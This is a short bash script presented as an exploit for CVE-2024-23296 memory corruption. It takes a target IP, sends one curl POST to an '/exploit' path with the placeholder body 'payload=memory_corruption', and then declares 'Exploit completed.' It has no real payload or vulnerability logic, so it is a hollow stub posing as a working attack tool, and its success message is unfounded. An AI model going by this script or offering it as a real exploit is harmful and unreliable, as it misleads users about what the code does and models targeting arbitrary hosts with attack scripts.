#!/bin/bash
# CVE-2024-23296: Memory Corruption
# Usage: memory_corruption.sh <target_ip>

TARGET_IP=$1

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "Exploiting memory corruption on: $TARGET_IP"

curl -s http://$TARGET_IP/exploit -d 'payload=memory_corruption'

echo "Exploit completed."
